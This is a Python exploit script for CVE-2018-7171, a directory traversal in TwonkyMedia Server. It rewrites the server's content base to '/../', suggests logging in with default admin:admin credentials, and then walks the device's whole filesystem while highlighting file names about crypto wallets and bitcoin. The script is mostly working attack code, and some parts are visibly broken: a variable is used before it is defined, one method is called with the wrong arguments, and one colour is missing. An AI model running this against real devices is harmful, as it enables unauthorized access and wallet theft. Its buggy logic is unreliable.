#!/usr/bin/python
'''
* ------------------------------------------------------------------------------
 *
 * This file is part of: TwonkyMedia Server 7.0.11-8.5 Directory Traversal CVE-2018-7171
 *
 * ------------------------------------------------------------------------------
 *
 * BSD 3-Clause License
 *
 * Copyright (c) 2018, Sven Fassbender
 * Author: Sven Fassbender
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this
 *   list of conditions and the following disclaimer.
 *
 * * Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * * Neither the name of the copyright holder nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *
 * * NON-MILITARY-USAGE CLAUSE
 *   Redistribution and use in source and binary form for military use and
 *   military research is not permitted. Infringement of these clauses may
 *   result in publishing the source code of the utilizing applications and
 *   libraries to the public. As this software is developed, tested and
 *   reviewed by *international* volunteers, this clause shall not be refused
 *   due to the matter of *national* security concerns.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * ------------------------------------------------------------------------------
'''
try:
    import sys
    import socket
    import requests
    import urllib3
except Exception:
    print ("Missing dependencies. Run 'sudo pip install -r requirements.txt'")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT_SECONDS=20

class Fore:
    RED   = "\033[1;31m"
    BLUE  = "\033[1;34m"
    REVERSE = "\033[;7m"
    GREEN = "\033[0;32m"
    MAGENTA = "\033[35m"
    END = '\033[1;37;0m'

class Color(Fore):
    pass

def print_color(color, text):
    print(color + text + Color.END)

# Extend KEYWORDS, list if you want. This will highlight files and directory names that include a keyword.
KEYWORDS = ["CRYPTO", "CRIPTO", "BITCOIN", "WALLET"]

def warningFileName(line):
    for keyword in KEYWORDS:
        if line.upper().find(keyword) != -1:
            return True
        return False

def checkPort(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host,int(port)))
        s.settimeout(2)
        s.shutdown(2)
        return True
    except Exception:
        return False

# Patch the contentbase parameter
def setContentBase(host, port):
    payload = "\ncontentbase=/../\n"
    url = "http://{0}:{1}/rpc/set_all".format(host, port)
    try:
        response = requests.post(url, data=payload, timeout=5)
    except requests.exceptions.ReadTimeout:
        print_color(Fore.RED, "*** Timeout while setting contentbase path to '/' ***")
    except requests.exceptions.ChunkedEncodingError:
        print_color(Fore.RED, "*** 'contentbase' cannot be modified, password protection active ***")
        sys.exit()
    except requests.exceptions.ConnectionError:
        url = "https://{0}:{1}/rpc/set_all".format(host, port)
        response = requests.post(url, data=payload, timeout=5, verify=False)
    if response.status_code != 200:
        print_color(Fore.RED, "*** 'contentbase' cannot be modified, password protection active ***")
        print_color(Fore.YELLOW, "*** You should try to login with admin:admin (default creds) ***")
        sys.exit()
    else:
        print_color(Fore.MAGENTA, "*** 'contentbase' path set to '/../' ***")
        return True

# Get some information about the target device
def serverInfo(host, port, client):
    timeout = 20
    print_color(Fore.MAGENTA, "*** Get Serverdetails from Twonky ***")
    try:
        friendlyname = client.friendly_name()
    except requests.exceptions.ConnectionError:
        friendlyname = client.friendly_name(ssl=True)
    if friendlyname.status_code == 200:
        print_color(Fore.GREEN, "Server Name: {0}".format(friendlyname.text))
    else:
        print_color(Fore.RED, "*** Not authorized to edit settings, password protection active ***")
        sys.exit()

    try:
        url = "http://{0}:{1}/rpc/info_status".format(host, port)
        infoStatus = requests.get(url, timeout=timeout)
    except requests.exceptions.ConnectionError:
        url = "https://{0}:{1}/rpc/info_status".format(host, port)
        infoStatus = requests.get(url, timeout=timeout, verify=False)
    for line in infoStatus.iter_lines():
        line = line.decode("utf8")
        if "version" in line:
            lineSplited = line.split("|")
            versionNumber = lineSplited[1]
            print_color(Fore.GREEN, "Twonky Version: {0}".format(versionNumber))
        elif line.find("serverplatform") != -1:
            lineSplited = line.split("|")
            serverPlatform = lineSplited[1]
            print_color(Fore.GREEN, "Serverplatform: {0}".format(serverPlatform))
        elif line.find("builddate") != -1:
            lineSplited = line.split("|")
            buildDate = lineSplited[1]
            print_color(Fore.GREEN, "Build date: {0}".format(buildDate))
        elif line.find("pictures") != -1:
            lineSplited = line.split("|")
            pictureCount = lineSplited[1]
            print_color(Fore.GREEN, "Pictures shared: {0}".format(pictureCount))
        elif line.find("videos") != -1:
            lineSplited = line.split("|")
            videoCount = lineSplited[1]
            print_color(Fore.GREEN, "Videos shared: {0}".format(videoCount))
    return versionNumber

# Check if the discovered Cookie is a valid PHP Session identifier for WD api
def checkSessionCookie(host, cookieString):
    url = "http://{0}/api/2.1/rest/device_user".format(host)
    cookieTemp = cookieString.split("_")
    cookie = {'PHPSESSID': cookieTemp[1]}
    response = requests.get(url, timeout=10, cookies=cookie)
    if response.status_code == 200:
        return cookie
    else:
        return False

class TwonkyClient:
    def __init__(self, host, port, timeout):
        self._host = host
        self._port = port
        self._timeout = timeout

    def _url_dir_items(self, path, ssl=False):
        raise NotImplementedError("This is a template pattern")

    def dir_items(self, path, ssl=False):
        return requests.get(self._url_dir_items(path, ssl), timeout=self._timeout, verify=False)

    def friendly_name(self, ssl=False):
        return requests.get(self._url_friendly_name(ssl), timeout=self._timeout, verify=False)

class TwonkyClientV8(TwonkyClient):
    def _url_dir_items(self, path, ssl=False):
        schema = "https" if ssl else "http"
        return f"{schema}://{self._host}:{self._port}/rpc/dir?path={path}"

    def _url_friendly_name(self, path, ssl=False):
        schema = "https" if ssl else "http"
        return f"{schema}://{self._host}:{self._port}/rpc/get_friendlyname"

class TwonkyClientV7(TwonkyClient):
    def _url_dir_items(self, path, ssl=False):
        schema = "https" if ssl else "http"
        return f"{schema}://{self._host}:{self._port}/rpc/dir/path={path}"

    def _url_friendly_name(self, path, ssl=False):
        schema = "https" if ssl else "http"
        return f"{schema}://{self._host}:{self._port}/rpc/get_friendlyname"


def browser(client):
    def do_request(client, var):
        try:
            return client.dir_items(var)
        except requests.exceptions.ConnectionError:
            return client.dir_items(var, ssl=True)

    def print_item(id, type, name):
        if warningFileName(name):
            print (id, Fore.RED + type, name)
        else:
            print(id, Fore.GREEN + type, name)

    def extract_type_name(line):
        filetypes = {'D': 'Dir', 'F': 'File'}
        id = line[0:3]
        type = line[3]
        name = line[4:]
        return id, filetypes[type], name

    def do_print_results(content, path, path_id):
        for line in content:
            line = line.decode("utf8")
            if line and len(line) > 3 :
                id, type, name = extract_type_name(line)
                print_item(id, type, path + "/" + name)
                if type == 'Dir':
                    next_path = path + "/" + name
                    next_path_id = path_id + "/" + id
                    response = do_request(client, next_path_id)
                    do_print_results(response.iter_lines(), next_path, next_path_id)

    while True:
        path = input("path nr (enter='/'): ")
        if path == "exit":
            sys.exit()
        response = do_request(client, path)
        print ("-" * 30)
        do_print_results(response.iter_lines(), "", "")


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print ("Usage: $ " + sys.argv[0] + " [IP_adress] [port]")
        exit

    try:
        host = sys.argv[1]
        port = sys.argv[2]
        timeout = DEFAULT_TIMEOUT_SECONDS
        if not checkPort(host, port):
            print(Fore.RED, "Error, can´t open port {}".format(port))
            exit

        print_color(Fore.MAGENTA, "https://www.shodan.io/host/{0}".format(host))
        print_color(Fore.GREEN, "*** Port {0} opened ***".format(port))
        twonky = input("Run Twonky browser on port {0} [Y, N]? [Y] ".format(port))
        if twonky.upper() != "N":
            client = TwonkyClientV8(host, port, timeout) if version == "8" else TwonkyClientV7(host, port, timeout)
            version = serverInfo(host, port, client)
            if setContentBase(host, port):
                browser(client)
    except requests.exceptions.ReadTimeout:
        print(f"Timeout requesting to {host}:{port} using {timeout} of timeout. Consider to raising it")
